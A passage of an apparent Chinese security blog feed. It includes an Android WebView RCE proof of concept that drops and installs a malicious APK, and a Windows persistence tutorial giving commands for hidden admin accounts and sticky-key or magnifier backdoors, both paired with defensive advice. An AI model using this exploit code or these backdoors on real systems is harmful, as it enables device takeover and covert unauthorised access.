class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> i=<span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">getContents</span>(<span class="params">inputStream</span>)</span></span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> contents = <span class="string">&quot;&quot;</span>+i;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> b = inputStream.read();</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> i = <span class="number">1</span>;</span></span><br><span class="line"><span class="javascript">      <span class="function"><span class="title">while</span>(<span class="params">b != -<span class="number">1</span></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> bString = <span class="built_in">String</span>.fromCharCode(b);</span></span><br><span class="line">          contents += bString;</span><br><span class="line"><span class="javascript">          contents += <span class="string">&quot;\n&quot;</span></span></span><br><span class="line">          b = inputStream.read();</span><br><span class="line">      &#125;</span><br><span class="line">      i=i+1;</span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> contents;</span></span><br><span class="line">     &#125;</span><br><span class="line">    </span><br><span class="line"><span class="javascript">     <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">cmdArgs</span>)</span></span></span><br><span class="line">     &#123;</span><br><span class="line"><span class="javascript">      <span class="keyword">for</span> (<span class="keyword">var</span> obj <span class="keyword">in</span> <span class="built_in">window</span>) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="built_in">console</span>.log(obj);</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> <span class="keyword">in</span> <span class="built_in">window</span>[obj]) &#123;</span></span><br><span class="line">              alert(obj);</span><br><span class="line"><span class="javascript">              <span class="keyword">return</span> <span class="built_in">window</span>[obj].getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmdArgs);</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125; </span><br><span class="line">     </span><br><span class="line"><span class="javascript">     <span class="keyword">var</span> res = execute([<span class="string">&quot;/system/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ls -al /sdcard&quot;</span>]); </span></span><br><span class="line"><span class="javascript"> <span class="built_in">document</span>.write(getContents(res.getInputStream()));</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220624162610.png" alt="image-20220624162610924"></p><p>想要上线需要执行反弹shell,但是鉴于我是android4.1操作系统，且没有nc等反弹shell的命令，所以只能通过注入木马执行上线。</p><p>第一种方法是安装木马apk，安装后需要用户主动点击上线；</p><p>第二种方法是通过注入一个二进制木马文件，然后远程代码执行进行上线。</p><p>由于第一种时效性不好，所以我们尝试第二种。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bin = <span class="string">&quot;\\x50\\x4b\\x03\\x04\\x14\\x85\\xbe\\x86\\xbe\\x83\\x5e\\x40\\x3f\\x42\\xbf--------\\x40\\x7f&quot;</span>  </span><br><span class="line">execute([<span class="string">&quot;/system/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo &#x27;&quot;</span>+bin+<span class="string">&quot;&#x27; &gt; /data/data/com.example.webviewtest/testBin&quot;</span>]);</span><br><span class="line">execute([<span class="string">&quot;chmod&quot;</span>,<span class="string">&quot;755&quot;</span>,<span class="string">&quot;/data/data/com.example.webviewtest/testBin&quot;</span>]);</span><br><span class="line">execute([<span class="string">&quot;/data/data/com.example.webviewtest/testBin&quot;</span>]);</span><br></pre></td></tr></table></figure><p>实现过程：通过msf生成相应系统版本（x86/x86）的<code>elf</code>，再将shellcode转为16进制（<strong>必须是\\x格式</strong>），由加载的js代码实现反射。app安装后，可以实现打开瞬间上线</p><p>在我想要尝试注入恶意apk文件，发现shellcode文件大小存在限制，测试发现shellcode代码量过大会加载不完全，整个过程webview显示页面会卡住，并不能实现正常上线效果，所以通过<strong>分步注入</strong>分步写入apk shellcode，具体实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> armBinary1 = <span class="string">&quot;\\x50\\x4b\\x03\\x04\\x14\\x42\\xbf--------\\x40\\x7f&quot;</span></span><br><span class="line"><span class="keyword">var</span> armBinary2 = <span class="string">&quot;\\x93\\x9a\\xff\\xa2\\x56--------\\x5f\\x0a\\x3d\\&quot;</span></span><br><span class="line"><span class="keyword">var</span> armBinary3 = <span class="string">&quot;\\xdb\\x06\\x00\\x00\\x0c\\x1c--------\\\\x00\\x00\\x13&quot;</span></span><br><span class="line"><span class="keyword">var</span> armBinary4 = <span class="string">&quot;\\x2e\\x78\\x6d\\x6c\\xad\\x97--------\\\\xcb\\x00\\x00\\x00&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">execute([<span class="string">&quot;/system/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo -n &#x27;&quot;</span>+armBinary1+<span class="string">&quot;&#x27; &gt;  /mnt/sdcard/evil.apk&quot;</span>]);</span><br><span class="line">execute([<span class="string">&quot;/system/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo -n &#x27;&quot;</span>+armBinary2+<span class="string">&quot;&#x27; &gt;&gt;  /mnt/sdcard/evil.apk&quot;</span>]);</span><br><span class="line">execute([<span class="string">&quot;/system/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo -n &#x27;&quot;</span>+armBinary3+<span class="string">&quot;&#x27; &gt;&gt;  /mnt/sdcard/evil.apk&quot;</span>]);</span><br><span class="line">execute([<span class="string">&quot;/system/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo -n &#x27;&quot;</span>+armBinary4+<span class="string">&quot;&#x27; &gt;&gt;  /mnt/sdcard/evil.apk&quot;</span>]);</span><br><span class="line">execute([<span class="string">&quot;su&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;pm install -r /mnt/sdcard/evil.apk&quot;</span>]);</span><br></pre></td></tr></table></figure><p>通过将shellcode分成多份，再对文件进行追加写入，最后pm install 安装指定位置下的恶意apk。</p><p>项目地址：<a href="https://github.com/dummersoul/Android-webview-inject-shell">Android-webview-inject-shell</a> </p><h2 id="四、Webview历史发展"><a href="#四、Webview历史发展" class="headerlink" title="四、Webview历史发展"></a>四、Webview历史发展</h2><p>在API level低于16时，android系统对<code>webView.addJavascriptInterface</code>并没有进行任何校验，漏洞编号：<strong>CVE-2012-6336</strong> （Android &lt;= 4.1.2）</p><p>出现第一个RCE漏洞之后，android为了防止java层的函数被随意调用，规定被调用的函数必须以<code>@JavascriptInterface</code>进行注释，且不能随意给Java层函数添加 <code>@JavascriptInterface</code></p><p>防护建议：</p><p>尽量不要使用addJavascriptInterface接口，以免带来不必要的安全隐患，如果一定要使用addJavascriptInterface接口：</p><ul><li>如果使用 HTTPS 协议加载 URL，应进行证书校验防止访问的页面被篡改挂马</li><li>如果使用 HTTP 协议加载 URL，应进行白名单过滤、完整性校验等防止访问的页面被篡改</li><li>如果加载本地 Html，应将 html 文件内置在 APK 中，以及进行对 html 页面完整性的校验</li></ul><p>在2014年发现了android系统中<code>java/android/webkit/BrowserFrame.java</code>中的<code>searchBoxJavaBridge_</code>接口存在远程代码执行漏洞，漏洞编号：<strong>CVE-2014-1939</strong> （Android &lt;= 4.3.1）</p><p>防护建议：移除存在漏洞的接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">removeJavascriptInterface(<span class="string">&quot;searchBoxJavaBridge_&quot;</span>);</span><br></pre></td></tr></table></figure><p>同年香港理工大学研究人员发现了webkit中默认接口位于<code>java/android/webkit/AccessibilityInjector.java</code>，分别是<code>accessibility</code>和<code>accessibilityTraversal</code>，调用这个组件的应用在开启辅助功能选项中第三方服务的安卓系统会造成远程代码执行漏洞。漏洞编号：**CVE-2014-7224 **（Android &lt;= 4.4）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">removeJavascriptInterface(<span class="string">&quot;accessibility&quot;</span>);</span><br><span class="line">removeJavascriptInterface(<span class="string">&quot;accessibilityTraversal&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>通过java的反射机制致使未进行安全防护的交互接口存在远程代码执行漏洞，存在于android4.4版本之前，初步了解了在安卓系统组件中存在的漏洞。</p><h2 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h2><p><a href="https://cloud.tencent.com/developer/article/1743487">关于Android中WebView远程代码执行漏洞浅析</a></p><p><a href="https://www.usmacd.com/2021/11/05/webview_java/">Android WebView 漏洞</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows手动杀毒的方法</title>
      <link href="2023/11/28/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91Windows%E6%89%8B%E5%8A%A8%E6%9D%80%E6%AF%92%E7%9A%84%E6%96%B9%E6%B3%95/"/>
      <url>2023/11/28/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91Windows%E6%89%8B%E5%8A%A8%E6%9D%80%E6%AF%92%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>转载自：<a href="http://blog.chinaunix.net/uid-69952968-id-5843858.html">http://blog.chinaunix.net/uid-69952968-id-5843858.html</a></p><h2 id="一、注册表清除"><a href="#一、注册表清除" class="headerlink" title="一、注册表清除"></a>一、注册表清除</h2><p>​    利用注册表加载运行如下所示的注册表位置是木马的藏身之处：<br>　　HKEY_LOCAL_MACHING\Software\Windows\Current Version下所有以“run”开头的键值。<br>　　HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version下所有以“run”开头的健值。<br>　　HKEY_USERS\Default\Software\Microsoft\Windows\Current Version下所有以“run”开头的健值。</p><h2 id="二、系统文件"><a href="#二、系统文件" class="headerlink" title="二、系统文件"></a>二、系统文件</h2><p>​    在System.ini中启动，System.ini位于Windows的安装目录下，其“boot”字段的Shell=Explore.exe是木马的隐蔽加载场所，木马通常的做法是将该句变为Shell=Explore.exe，注意这里的Window.exe就是木马服务端程序。</p><h2 id="三、启动命令"><a href="#三、启动命令" class="headerlink" title="三、启动命令"></a>三、启动命令</h2><p>​    在Win.ini中启动，在Win.ini的“Windows”字段中有启动命令“load=”和“run=”，在一般情况下“=”后面是空白的，如果后面跟着程序，内有可能是木马。</p><h2 id="四、修改文件关联"><a href="#四、修改文件关联" class="headerlink" title="四、修改文件关联"></a>四、修改文件关联</h2><p>​    修改文件关联是木马常用手段，比如说下沉情况下TXT文件的打开方式为Notepad.exe文件，但一旦中了文件关联木马，则TXT文件的打开文件就会被修改为用木马程序打开。</p><h2 id="五、在Autoexec-bat和Config-sys中加载运行"><a href="#五、在Autoexec-bat和Config-sys中加载运行" class="headerlink" title="五、在Autoexec.bat和Config.sys中加载运行"></a>五、在Autoexec.bat和Config.sys中加载运行</h2><p>​    在C盘根目录下的这两个文件也可以启动木马。但这种加载一般都需要控制用户与服务端建立连接后，将已添加木马启动命令的同名文件上传到服务端覆盖这两个文件才行，而且采用这种方式不是很隐蔽，容易被发现。所以在Autoexec.bat和Config.sys中加载木马程序的并不多见，但也不能因此而掉以轻心。</p><h2 id="六、在Winstart-bat中启动"><a href="#六、在Winstart-bat中启动" class="headerlink" title="六、在Winstart.bat中启动"></a>六、在Winstart.bat中启动</h2><p>​    Winstart.bat具有系统特殊性，也是一个能启动并被Windows加载运行的文件。它多数情况下为应用程序及Windows自动生成，在执行了Win .com并加载了一些驱动程序之后开始执行。由于Autoexec.bat的功能可以由Winstart.bat代替完成，因此木马完全可以像在Autoexec.bat中那样被加载运行。</p><h2 id="七、反复感染木马的文件"><a href="#七、反复感染木马的文件" class="headerlink" title="七、反复感染木马的文件"></a>七、反复感染木马的文件</h2><p>​    实现这种触发条件首先要控制端和服务端已通过木马建立连接，然后控制端用户用工具软件将木马文件和某一应用程序捆绑在一起，上传到服务端覆盖原文件。这样即使木马被删除了，只要运行捆绑了木马的应用程序，木马又会安装上去。如绑定到系统文件，那么每一次Windows启动均会启动木马。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows权限维持及防范</title>
      <link href="2023/11/28/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E9%98%B2%E8%8C%83/"/>
      <url>2023/11/28/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E9%98%B2%E8%8C%83/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>维持权限同样是渗透测试非常重要的一环，他可以让我们方便的再次进入系统并且降低被发现的概率，而维持权限的方式也就是留后门，了解一些常见的后门技术，不仅可以在进攻时提供维持权限的思路，同时，在防守时也可以更准确的发现隐患。</p><h2 id="隐藏账户"><a href="#隐藏账户" class="headerlink" title="隐藏账户"></a>隐藏账户</h2><p>隐藏账户应该是最常见的后门方式，其设置方式如下：</p><p>首先我们在命令行输入，如下命令创建一个隐藏账号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user leticia$ 123456 &#x2F;add</span><br></pre></td></tr></table></figure><p>这个时候，通过net user并不能看到这个账户。</p><p><a href="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor01.png?raw=true"><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor01.png?raw=true" alt="img"></a></p><p>然后我们将它添加到管理员权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators leticia$ &#x2F;add</span><br></pre></td></tr></table></figure><p><a href="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor02.png?raw=true"><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor02.png?raw=true" alt="img"></a></p><p>但是这个“隐藏账户”在用户账户中可以看到，并不能骗过细心的管理员。</p><p><a href="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor03.png?raw=true"><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor03.png?raw=true" alt="img"></a></p><p>这个时候我们可以通过操作注册表，使这个账户在用户账户中也不显示。首先我们输入regedit打开注册表编辑器，找到HKEY_LOCAL_MACHINE\SAM\SAM，我们发现这个时候它是空白的，没有权限进行操作，所以我们要右键权限，将读写权限赋予administrator。</p><p><a href="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor04.png?raw=true"><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor04.png?raw=true" alt="img"></a></p><p>然后我们重启注册表编辑器，发现这个时候已经可以访问了，我们在里面找到刚才创建的leticia$账号和administrator账号对应的键值类型。</p><p><a href="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor05.png?raw=true"><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor05.png?raw=true" alt="img"></a></p><p><a href="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor06.png?raw=true"><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor06.png?raw=true" alt="img"></a></p><p>然后在上一级文件中找键值类型对应的目录，将administrator对应目录中的F值复制到leticia$对应目录中的F值。</p><p><a href="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor07.png?raw=true"><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor07.png?raw=true" alt="img"></a></p><p>复制完成后，把leticia$和其对应的0000003EA目录先导出并保存。</p><p><a href="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor08.png?raw=true"><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor08.png?raw=true" alt="img"></a></p><p>然后在命令行中删除刚才的账号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user leticia$ &#x2F;del</span><br></pre></td></tr></table></figure><p><a href="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor09.png?raw=true"><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor09.png?raw=true" alt="img"></a></p><p>最后将刚才导出的注册表文件重新导入，隐藏账户就添加成功了。</p><p><a href="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor10.png?raw=true"><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor10.png?raw=true" alt="img"></a></p><p>此时在用户账户中看不到这个隐藏账户。</p><p><a href="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor11.png?raw=true"><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor11.png?raw=true" alt="img"></a></p><p>这个时候其实已经完成了，但是我们还可以再走一步操作，那就是把注册表刚才赋予administrator的权限禁止掉，这样这个账户就很难被发现了。</p><p>防范：</p><ul><li>经常检查用户账户、注册表关键位置。</li><li>将计算机对用户登陆事件的审核策略打开。</li></ul><h2 id="shift后门"><a href="#shift后门" class="headerlink" title="shift后门"></a>shift后门</h2><p>shift后门是很常见的留后门手法，其原理是用cmd.exe替换原先粘滞键，粘滞键的程序sethc.exe可以通过五次shift键调用，这样我们就可以直接通过按五次shift来调用一个system权限的命令行来执行命令、创建用户等。</p><p>shift后门有着非常丰富的骚操作，我们先来通过一个最基础的shift后门来学习原理。</p><p>制作方法如下：</p><p>我们先进入C:\WINDOWS\system32目录,在这里右键打开命令行，依次输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move sethc.exe sethc.exe.bak</span><br><span class="line">copy cmd.exe sethc.exe</span><br></pre></td></tr></table></figure><p><a href="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor12.png?raw=true"><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor12.png?raw=true" alt="img"></a></p><p>这两句命令分别是将粘滞键程序备份，然后用cmd.exe覆盖原本的粘滞键程序。</p><p>然后我们每次要使用时按5次shift键弹出cmd窗口，可直接以system权限执行系统命令，创建管理员用户，登录服务器等。最后每次删除掉新建的账户，减少被发现的概率。</p><p>如图，我们可以在登陆界面就直接调用cmd：</p><p><a href="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor13.png?raw=true"><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor13.png?raw=true" alt="img"></a></p><p>防范：</p><ul><li>自行呼出粘滞键检查问题。</li><li>禁用粘滞键。</li></ul><h2 id="启动项后门"><a href="#启动项后门" class="headerlink" title="启动项后门"></a>启动项后门</h2><p>我们可以让目标机器在每次启动的时候创建一个账户，在这个思路下有很多可以采取的措施，第一种是启动项：</p><p>在C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup目录中，放入我们启动时要运行的批处理代码或其他可运行文件，一般是创建一个管理员账户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">net user leticia$ 123456 &#x2F;add </span><br><span class="line">net localgroup administrators leticia$ &#x2F;add</span><br></pre></td></tr></table></figure><p>防范：</p><ul><li>定期检查启动文件夹内容。</li></ul><h2 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h2><p>第二种方法是组策略，可以在gpedit.msc中的windows设置-脚本(启动/关机)中添加新的启动脚本，在开机时就会自动运行。</p><p><a href="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor14.png?raw=true"><img src="https://github.com/echohun/blog_image/blob/master/windows_backdoor/backdoor14.png?raw=true" alt="img"></a></p><p>相比于第一种放在启动目录中，放在组策略中更加隐蔽，一般不容易引起管理员察觉，从而降低被删除的概率。</p><p>防范：</p><ul><li>定期检查组策略。</li></ul><h2 id="放大镜后门"><a href="#放大镜后门" class="headerlink" title="放大镜后门"></a>放大镜后门</h2><p>放大镜后门其实和shift后门很相似，我们可以先备份放大镜程序magnify.exe为magnify2.exe，然后写一个创建新用户并打开真正的放大镜的程序(防止被管理员发现放大镜程序失效),再将其转换为exe文件，并重命名成magnify.exe，然后通过调用放大镜程序来创建新用户供我们登陆。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">net user leticia$ 123456 &#x2F;add </span><br><span class="line">net localgroup administrators leticia$ &#x2F;add</span><br><span class="line">c:\windows\system32\magnify2.exe</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>防范：</p><ul><li>调用放大镜检查。</li><li>定期检查用户组。</li></ul><h2 id="telnet后门"><a href="#telnet后门" class="headerlink" title="telnet后门"></a>telnet后门</h2><p>如果我们直接打开远程桌面的3389很容易就会被发现，但是我们打开telnet服务并改变默认端口(23)，就可以做一定程度的隐藏，我们在服务中打开telnet服务，然后将windows服务中的telnet客户端打开，然后在我们本机打开telnet服务端，访问目标主机ip和端口并登陆我们的用户名密码即可。</p><p>防范：</p><ul><li>定期检查服务器的进程端口有没有存在后门程序。</li></ul><h2 id="启用Guest用户"><a href="#启用Guest用户" class="headerlink" title="启用Guest用户"></a>启用Guest用户</h2><p>Guest用户本身就存在于计算机中，但是一般默认禁止，且不可登录，我们可以通过命令激活Guest用户并赋予管理员权限，并允许远程桌面登录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user Guest &#x2F;active:yes</span><br><span class="line">net user Guest www.baidu.com</span><br><span class="line">net localgroup Administrators Guest &#x2F;ADD</span><br></pre></td></tr></table></figure><p>gpedit.msc-&gt;计算机配置-&gt;windows设置-&gt;安全设置-&gt;本地策略-&gt;用户权限分配-&gt;允许通过远程桌面服务登录 添加Guest</p><p>防范：</p><ul><li>定期检查gpedit.msc-&gt;计算机配置-&gt;windows设置-&gt;安全设置-&gt;本地策略-&gt;用户权限分配中关于Guest用户的权限配置</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>留后门的方法有很多很多，但是大部分人会首先从这些方面入手，所以在检查系统有没有被留后门，也可以换位思考，在自己可能留后门的点上多注意一下，或许就会有收获。</p><p>转载自<a href="http://next.uuzdaisuki.com/2018/06/18/windows%E5%B8%B8%E7%94%A8%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%8F%8A%E9%98%B2%E8%8C%83/">http://next.uuzdaisuki.com/2018/06/18/windows%E5%B8%B8%E7%94%A8%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%8F%8A%E9%98%B2%E8%8C%83/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> 权限维持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo搭建个人博客</title>
      <link href="2020/10/28/hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>2020/10/28/hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">hexo new <span class="string">&quot;postName&quot;</span> <span class="comment">#新建文章 </span></span><br><span class="line">hexo new page <span class="string">&quot;pageName&quot;</span> <span class="comment">#新建页面</span></span><br><span class="line">hexo <span class="built_in">help</span> <span class="comment"># 查看帮助 </span></span><br><span class="line">hexo version <span class="comment">#查看Hexo的版本</span></span><br><span class="line"></span><br><span class="line">hexo n == hexo new </span><br><span class="line">hexo g == hexo generate </span><br><span class="line">hexo s == hexo server </span><br><span class="line">hexo d == hexo deploy</span><br><span class="line"></span><br><span class="line">hexo s -g <span class="comment">#生成并本地预览 </span></span><br><span class="line">hexo d -g <span class="comment">#生成并上传</span></span><br></pre></td></tr></table></figure><h2 id="seo优化"><a href="#seo优化" class="headerlink" title="seo优化"></a>seo优化</h2><h3 id="百度收录"><a href="#百度收录" class="headerlink" title="百度收录"></a>百度收录</h3><p>site:dummersoul.top</p><p>搜索后啥也没有，因为还未收录，在<a href="https://ziyuan.baidu.com/site/siteadd#/">百度资源站点管理</a> 里添加我的网站，再选择一种方式验证（我用的CNAME验证）</p><p>在阿里云域名管理里添加一条解析</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210113132605714.png" alt="image-20210113132605714"></p><p>添加完成后，点击“完成验证”</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210113132545741.png" alt="image-20210113132545741"></p><h3 id="生成sitemap"><a href="#生成sitemap" class="headerlink" title="生成sitemap"></a>生成sitemap</h3><p>安装sitemap插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-sitemap --save     </span><br><span class="line">npm install hexo-generator-baidu-sitemap --save</span><br></pre></td></tr></table></figure><p>修改_config.yml配置文件，将url改为自己的url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url: https:&#x2F;&#x2F;dummersoul.top</span><br></pre></td></tr></table></figure><p><strong>执行完之后就会在网站根目录生成sitemap.xml文件和baidusitemap.xml文件</strong></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210113152149761.png" alt="image-20210113152149761"></p><p>然后hexo g &amp;&amp; hexo d </p><p>网页可以直接访问baidusitemap.xml</p><p>然后将这个sitemap文件提交给<a href="https://ziyuan.baidu.com/linksubmit/index?site=https://dummersoul.top/">百度收录网址</a></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210113140716156.png" alt="image-20210113140716156"></p><p>等待收录成功就可以了。</p><h3 id="谷歌收录"><a href="#谷歌收录" class="headerlink" title="谷歌收录"></a>谷歌收录</h3><p>其实谷歌收录步骤和百度一样，先进行验证，再直接提交sitemap文件即可</p><p><a href="https://www.google.com/webmasters/tools/home?hl=zh-CN">谷歌收录地址</a></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210113152649434.png" alt="image-20210113152649434"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210113152737430.png" alt="image-20210113152737430"></p><p>添加DNS解析记录</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210113153002998.png" alt="image-20210113153002998"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210113152906340.png" alt="image-20210113152906340"></p><p>添加sitemap</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210113153156720.png" alt="image-20210113153156720"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210113153237254.png" alt="image-20210113153237254"></p><p>谷歌的效率比百度高几百倍，等都不用等的，就直接成功了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a 